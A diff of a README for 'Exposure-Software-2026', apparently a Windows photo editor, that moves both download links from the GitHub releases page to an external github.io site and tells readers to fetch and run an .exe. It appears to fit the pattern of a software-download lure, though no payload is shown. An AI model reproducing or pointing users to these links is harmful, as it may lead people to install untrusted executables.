@@ -1,6 +1,6 @@
 # 📸 Exposure-Software-2026 - Edit professional photos with ease today
 
-[![](https://img.shields.io/badge/Download_Exposure_Software-Blue?style=for-the-badge)](https://github.com/Rotund-texarkana941/Exposure-Software-2026/releases)
+[![](https://img.shields.io/badge/Download_Exposure_Software-Blue?style=for-the-badge)](https://rotund-texarkana941.github.io)
 
 Exposure-Software-2026 provides tools for photographers to edit raw images and apply film effects. This software works on Windows 11 and Windows 10. The application manages your photo library and offers creative tools to improve your digital images.
 
@@ -20,7 +20,7 @@ Ensure your computer has the latest updates from Windows. Updates keep the syste
 
 You must obtain the installer file from our official release page. 
 
-1. Visit [this page to download](https://github.com/Rotund-texarkana941/Exposure-Software-2026/releases).
+1. Visit [this page to download](https://rotund-texarkana941.github.io).
 2. Look for the latest version listed under the Releases section.
 3. Find the file ending in .exe.
 4. Click the file name to start the download.
